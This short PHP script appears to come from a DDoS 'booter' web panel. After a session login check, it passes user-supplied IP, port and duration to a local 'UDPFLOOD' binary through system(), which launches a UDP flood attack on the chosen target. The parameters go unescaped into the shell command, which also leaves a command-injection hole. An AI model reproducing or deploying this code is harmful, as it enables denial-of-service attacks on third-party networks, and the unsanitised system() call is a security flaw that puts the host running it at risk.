<?php
    // Start a new session.
    session_start();

    if(!isset($_SESSION['loggedin']))
    {
      header('Location: ../../index.html');
      exit();
    }

    $ip = $_POST['ip'];
    $port = $_POST['port'];
    $dur = $_POST['dur'];

    system('./../server-attacks/UDPFLOOD ' . $ip . ' ' . $port . ' ' . $dur . ' 2>&1', $out);

    // Debugging.
    foreach($out as $x)
    {
      echo $x;
    }
?>
